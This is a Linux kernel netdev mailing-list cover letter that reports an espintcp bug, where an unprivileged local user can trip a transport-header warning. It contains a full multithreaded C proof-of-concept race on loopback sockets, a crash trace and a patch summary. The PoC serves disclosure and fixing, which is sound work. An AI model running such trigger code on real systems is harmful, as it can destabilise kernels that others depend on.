Received: from mail-pl1-f176.google.com (mail-pl1-f176.google.com [209.85.214.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3773733A70E
	for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 15:44:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788018286; cv=none; b=TeWa/u4Fhg5GeaDCEyVEyL3b4jG/dKIZmF8HskafFAWRiFHAQdJ30Lr7FIqYW+reBILcwM6Mlr4GgvSKGsvSRslj+u4gDuMpLerUZi1AmJxxEroLPwZHWzSdRRBfKJrAC5OeEojmykLOw9Weo4b2nWEguUsLCS0M20Wq6cFHaB8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788018286; c=relaxed/simple;
	bh=kJQKkZUu71mizzfBlVbm05qqbfj5sinAX4y/GzvwuGY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=iZdEp0k/XnfVbdE8YVx4IXcn486c5mODD1jRCqMC5vRBQllbV3qLjNXMoiC9PXEBLuAwGhu9cvK+jUb/j33bAy5BvamEelsFdlIQ9ZBud/ihrwTQWTDSVVzOZhv7VarRGWRCaDA1FSwy3PjjQ+WGVwxPp2+UnW5i6Gku9kcfQR8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=b8tSi7dN; arc=none smtp.client-ip=209.85.214.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="b8tSi7dN"
Received: by mail-pl1-f176.google.com with SMTP id d9443c01a7336-2caced6038eso20715595ad.0
        for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 08:44:45 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788018285; x=1788623085; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=1extyuhr+RTiEO1Fk9FbPircnnyJx00y7FNrlbFfEFY=;
        b=b8tSi7dNIRtepNvukfsq8FdWozD5BQdZG/hWsTshwytOc9jlK5cnpzEZs1LVVbsykp
         MvC7JHzhJDvyb4TsSjmEmgW6GnvHyPFDCyFM7iWxZ8KPjAkLg4JpfurgfSFKz4SGruWP
         dBLXyXvdGUBupRi9vI59rn1IQowfNb4dqPhd4Jt5b+QBJWhhmYR9YCNQNYXjcGW5UvSs
         CcLkhn0F9E5Wbjr+a+b2DwzvPOSqzAwgMN3HfDQxvTYttlxPvtO8+CFwTmyAXAF7gltw
         nVs12FBTG2PVgOwD5+VWBSjQJI0mdm9cw9IjIx7iUeV18BrKP5Oe2aseGw27qzkn3on3
         jvKg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788018285; x=1788623085;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=1extyuhr+RTiEO1Fk9FbPircnnyJx00y7FNrlbFfEFY=;
        b=byE72+Zvc7thGsaB9bE0XLdi1mP59GHblmq1W0ZwDF4aqq+hGJjPO+HyBX0AqPrLYH
         NE6HWVrPlI3m/KavLGafArfePwA1oX1dTjS1BPA0/spXfYsSxdIL+mkJdf0hzcB7sS5j
         M63A362UuZCiJfdLl3FKc7CLnB+GoR6ksDoLhE/bsy70UL6lfjOJ3Q6aPHMNA94qdgm8
         YIpof9euTUhoKLBZgFqUWqdTSk/KfO1IIKVNp3dmumS7yINzDwpxs5X134Da/+K6ypzE
         U0HQ2dntmb1T+oVaFo2U/JOumw/jC7R+f94d9r/bZQBHsWQ0U1Up+FicnNWG/Z7yB4gJ
         Unbw==
X-Gm-Message-State: AFuF++lzXP7QH0u/sLRL6rxJkESVP5+AcG3QA/Q6IVihuhwwBUg6J+Zc
	fQ0CJ21ibT/vuz/ZhJK8S5lRxKMsbIlfyPkFUogpwMjIsBz2qGbHTuD0E/Ql1KFKS6GGkdX8v1q
	h8eRhSPNg
X-Gm-Gg: AR+sD12DWhl7RRjfPtLixiXwp+AhqqF9fML1R/N13rPmodC959GtYYZTsurZydG+NEF
	yg4fHLNZ09J3kGRu6MzvI/xrZT/fpTyKG5Fllqb9IRXGobrtd5hl6MX8vYQK/hrRpRmTQ4cUr2h
	LZd3tYQKZu7BXN8+eGy+qoCNRx4oWsk9/XhL1i2KqoXC7gZpk0i/gVOippQ0f3lcYvB+XvzdO9y
	hjXzzWiS3pvMNoV6oMLUDnK7SRHt3MinyhvOPmwkjjm7ZOuSfpASiQek35nHfxOjt7dm/yOhgkN
	oNQo1fCA1KR4LMpkzC8C5TIhb2JcOvyC/0CF2VETWDP+PoxQh2pFGdKiIcY4H8keZUeCsw+nwIQ
	sKpRyJkbTpdrcI3MILG0XGCcJkCo7rmCgx7x8I4tS7Z6adbSU9THkq2Yz6MLK66LnfP68f7V+uV
	BiivRu4iy1sKq8oJqEsrKIADR9L5rQ73rHpziD2YePGC46Yi7c+FeicummpXPuPKiKZrZPq/M=
X-Received: by 2002:a17:903:184c:b0:2ca:12aa:a390 with SMTP id d9443c01a7336-2d8d469071amr68936795ad.0.1788018284439;
        Sat, 29 Aug 2026 08:44:44 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d759869283sm14999675ad.43.2026.08.29.08.44.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 29 Aug 2026 08:44:44 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	sd@queasysnail.net,
	vega@nebusec.ai,
	wf.kernel.dev@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: xfrm: espintcp can trip skb transport-header warning
Date: Sat, 29 Aug 2026 23:44:31 +0800
Message-ID: <cover.1787986691.git.wf.kernel.dev@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Wyatt Feng <wf.kernel.dev@gmail.com>

Hi Linux kernel maintainers,

We found an issue in net/xfrm/espintcp.c.
The bug is reachable by an unprivileged user on a local TCP socket.
The relevant details are provided below.

---- details below ----

Bug details:

The bug is in `handle_esp()` in ESP-in-TCP receive path. After
`strparser` trims the TCP framing, `handle_esp()` unconditionally calls
`skb_reset_transport_header()` before handing the skb to xfrm.

For some packets, that skb no longer has a transport-header offset that
fits the 16-bit skb field, so the plain reset truncates the offset and
hits the `DEBUG_NET_WARN_ON_ONCE()` check in
`include/linux/skbuff.h:3100`. The warning is reachable from the
ordinary `TCP_ULP("espintcp")` attach path and does not require
privileges beyond local socket access.

Reproducer:

cc -x c -O2 -pthread -Wall -Wextra -o poc mini_poc
timeout 240 ./poc 16 50000


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#define DEFAULT_WORKERS 8
#define DEFAULT_ATTEMPTS 20000
#define FILL_TARGET (8U << 20)

struct pair {
	int client_fd;
	int server_fd;
	atomic_int start;
	atomic_int stop;
};

struct worker_arg {
	int id;
	int attempts;
};

static int cpu_count(void)
{
	long n = sysconf(_SC_NPROCESSORS_ONLN);

	return n > 0 ? (int)n : 1;
}

static void pin_current(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}

static int set_nonblock(int fd)
{
	int flags = fcntl(fd, F_GETFL, 0);

	if (flags < 0)
		return -1;
	return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void tune_socket(int fd)
{
	int one = 1;
	int buf = 1 << 20;

	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
	setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &buf, sizeof(buf));
}

static void close_pair(struct pair *p)
{
	if (p->client_fd >= 0)
		close(p->client_fd);
	if (p->server_fd >= 0)
		close(p->server_fd);
}

static int open_listener(uint16_t *port)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	socklen_t len = sizeof(addr);
	int one = 1;
	int fd = socket(AF_INET, SOCK_STREAM, 0);

	if (fd < 0)
		return -1;
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		goto fail;
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		goto fail;
	if (listen(fd, 128) < 0)
		goto fail;
	if (getsockname(fd, (struct sockaddr *)&addr, &len) < 0)
		goto fail;

	*port = ntohs(addr.sin_port);
	return fd;

fail:
	close(fd);
	return -1;
}

static int make_pair(int listen_fd, uint16_t port, struct pair *p)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
		.sin_port = htons(port),
	};
	socklen_t len = sizeof(addr);

	memset(p, 0, sizeof(*p));
	p->client_fd = -1;
	p->server_fd = -1;
	atomic_init(&p->start, 0);
	atomic_init(&p->stop, 0);

	p->client_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (p->client_fd < 0)
		return -1;

	tune_socket(p->client_fd);
	if (connect(p->client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		goto fail;

	p->server_fd = accept(listen_fd, (struct sockaddr *)&addr, &len);
	if (p->server_fd < 0)
		goto fail;

	tune_socket(p->server_fd);
	if (set_nonblock(p->client_fd) < 0 || set_nonblock(p->server_fd) < 0)
		goto fail;

	return 0;

fail:
	close_pair(p);
	return -1;
}

static void prefill_client(int fd)
{
	char buf[4096];
	size_t total = 0;

	memset(buf, 'A', sizeof(buf));
	while (total < FILL_TARGET) {
		ssize_t n = send(fd, buf, sizeof(buf), MSG_DONTWAIT | MSG_NOSIGNAL);

		if (n > 0) {
			total += (size_t)n;
			continue;
		}
		if (n < 0 && errno == EINTR)
			continue;
		if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
			return;
		return;
	}
}

static void *server_reader(void *arg)
{
	struct pair *p = arg;
	char buf[1 << 15];

	if (cpu_count() > 1)
		pin_current(1);

	while (!atomic_load_explicit(&p->start, memory_order_acquire))
		;

	while (!atomic_load_explicit(&p->stop, memory_order_relaxed)) {
		ssize_t n = recv(p->server_fd, buf, sizeof(buf), MSG_DONTWAIT);

		if (n > 0)
			continue;
		if (n == 0)
			break;
		if (n < 0 && errno == EINTR)
			continue;
		if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
			sched_yield();
			continue;
		}
		break;
	}

	return NULL;
}

static void *server_writer(void *arg)
{
	struct pair *p = arg;
	char buf[64];

	memset(buf, 'B', sizeof(buf));
	if (cpu_count() > 1)
		pin_current(1);

	while (!atomic_load_explicit(&p->start, memory_order_acquire))
		;

	while (!atomic_load_explicit(&p->stop, memory_order_relaxed)) {
		ssize_t n = send(p->server_fd, buf, sizeof(buf),
				 MSG_DONTWAIT | MSG_NOSIGNAL);

		if (n >= 0)
			continue;
		if (errno == EINTR)
			continue;
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			sched_yield();
			continue;
		}
		break;
	}

	return NULL;
}

static void *worker(void *arg)
{
	struct worker_arg *w = arg;
	const char ulp[] = "espintcp";
	uint16_t port;
	int listen_fd;

	if (cpu_count() > 0)
		pin_current(w->id % cpu_count());

	listen_fd = open_listener(&port);
	if (listen_fd < 0)
		return NULL;

	for (int i = 0; i < w->attempts; i++) {
		struct pair p;
		pthread_t reader;
		pthread_t writer;

		if (make_pair(listen_fd, port, &p) < 0)
			continue;

		prefill_client(p.client_fd);
		if (pthread_create(&reader, NULL, server_reader, &p) != 0) {
			close_pair(&p);
			continue;
		}
		if (pthread_create(&writer, NULL, server_writer, &p) != 0) {
			atomic_store(&p.stop, 1);
			pthread_join(reader, NULL);
			close_pair(&p);
			continue;
		}

		atomic_store_explicit(&p.start, 1, memory_order_release);
		setsockopt(p.client_fd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp) - 1);
		atomic_store(&p.stop, 1);

		pthread_join(writer, NULL);
		pthread_join(reader, NULL);
		shutdown(p.client_fd, SHUT_RDWR);
		shutdown(p.server_fd, SHUT_RDWR);
		close_pair(&p);
	}

	close(listen_fd);
	return NULL;
}

int main(int argc, char **argv)
{
	int workers = argc > 1 ? atoi(argv[1]) : DEFAULT_WORKERS;
	int attempts = argc > 2 ? atoi(argv[2]) : DEFAULT_ATTEMPTS;
	pthread_t *threads;
	struct worker_arg *args;

	if (workers < 1)
		workers = 1;
	if (attempts < 1)
		attempts = 1;

	signal(SIGPIPE, SIG_IGN);

	threads = calloc((size_t)workers, sizeof(*threads));
	args = calloc((size_t)workers, sizeof(*args));
	if (!threads || !args)
		return 1;

	fprintf(stderr, "espintcp race: workers=%d attempts=%d\n",
		workers, attempts);

	for (int i = 0; i < workers; i++) {
		args[i].id = i;
		args[i].attempts = attempts;
		if (pthread_create(&threads[i], NULL, worker, &args[i]) != 0)
			return 1;
	}

	for (int i = 0; i < workers; i++)
		pthread_join(threads[i], NULL);

	return 0;
}


------END PoC--------

----BEGIN crash log----

[  356.287141][    C1] ------------[ cut here ]------------
[  356.287203][    C1] offset != (typeof(skb->transport_header))offset
[  356.288037][    C1] WARNING: include/linux/skbuff.h:3100 at espintcp_rcv+0xfa9/0x1260, CPU#1: poc/17566
[  356.293674][    C1] CPU: 1 UID: 1001 PID: 17566 Comm: poc Tainted: G        W           7.2.0-15814-g2188569e7e1b #3 PREEMPT(full)
[  356.319324][    C1] Call Trace:
[  356.323986][    C1]  __strp_recv+0x285/0x1ad0
[  356.329220][    C1]  strp_read_sock+0x250/0x2a0
[  356.332560][    C1]  strp_data_ready+0x1d8/0x290
[  356.333568][    C1]  tcp_data_ready+0x114/0x5b0
[  356.334575][    C1]  tcp_data_queue+0x1af9/0x4fb0
[  356.341206][    C1]  tcp_rcv_established+0xb82/0x3990
[  356.345859][    C1]  tcp_v4_do_rcv+0xbb6/0x1260
[  356.346873][    C1]  tcp_v4_rcv+0x2ec1/0x4840
[  356.355659][    C1]  ip_local_deliver_finish+0x3f2/0x6e0
[  356.370020][    C1]  process_backlog+0x487/0x1600
[  356.372242][    C1]  net_rx_action+0xa40/0xf20
[  356.390892][    C1]  __local_bh_enable_ip+0xff/0x120
[  356.393050][    C1]  __dev_queue_xmit+0xa27/0x4970
[  356.428944][    C1]  tcp_rcv_established+0xc34/0x3990
[  356.439618][    C1]  tcp_recvmsg+0x14c/0x630
[  356.450072][    C1]  sock_recvmsg+0x1b8/0x220
[  356.455330][    C1]  __x64_sys_recvfrom+0xe0/0x1c0
[  356.485475][    C1] ---[ end trace 0000000000000000 ]---


-----END crash log-----

Best regards,
Wyatt Feng


Wyatt Feng (1):
  net: xfrm: reject unrepresentable espintcp transport headers

 net/xfrm/espintcp.c | 6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)

-- 
2.47.3

